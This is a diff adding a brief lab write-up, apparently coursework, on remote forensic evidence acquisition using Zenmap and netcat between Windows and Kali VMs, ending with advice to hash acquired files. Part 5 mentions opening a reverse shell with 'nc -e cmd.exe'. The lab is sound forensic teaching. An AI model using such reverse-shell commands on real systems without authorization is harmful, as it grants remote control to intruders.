@@ -1,0 +1,16 @@
+# Lab 5: Remote Evidence Acquisition
+
+# Part 1: Standard Devices
+Stdin (standard input), stdout (standard output), and stderr (standard error) are data streams used by tools like netcat to route data across networks and redirect it into files.
+
+# Part 2 & 3: Setup
+Created an evidence text file on a Windows VM. Used Zenmap on Kali Linux to scan the Windows IP, which revealed open ports, notably Port 445 (SMB).
+
+# Part 4: Remote Access
+Windows Listener: nc -l -p 12345 -w 10 < Evidence.txt
+Kali Connection: nc [Windows_IP] 12345 > Acquired_Evidence.txt
+Verified the successful transfer by reading the file using cat.
+
+# Part 5 & 6: Reverse Shell & Forensics
+Reverse Shell: Used nc -e cmd.exe from Windows to Kali to gain remote command execution.
+Remote Acquisition Best Practices: Because network transfers can be unstable and data is volatile, investigators must immediately hash acquired files upon arrival to prove evidence integrity and ensure it is admissible in court.
